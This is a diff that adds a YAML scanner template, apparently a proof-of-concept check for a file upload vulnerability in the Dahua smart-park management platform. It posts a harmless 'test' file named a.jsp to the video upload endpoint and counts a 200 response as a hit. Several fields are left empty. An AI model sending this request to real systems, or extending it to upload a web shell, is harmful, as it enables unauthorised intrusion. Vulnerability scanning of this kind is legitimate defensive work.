@@ -1,0 +1,31 @@
+id:
+
+info:
+  name: 大华智慧园区综合管理平台 video文件上传漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /publishing/publishing/material/file/video
+  headers:
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+    Content-Type: multipart/form-data; boundary=dd8f988919484abab3816881c55272a7
+    Accept-Encoding: gzip, deflate
+    Connection: close
+  data: |
+    --dd8f988919484abab3816881c55272a7
+    Content-Disposition: form-data; name="Filedata"; filename="a.jsp"
+
+    test
+    --dd8f988919484abab3816881c55272a7
+    Content-Disposition: form-data; name="Submit"
+
+    submit
+    --dd8f988919484abab3816881c55272a7--
+response1:
+  body: true
+  code: 200
+requests2:
+response2:
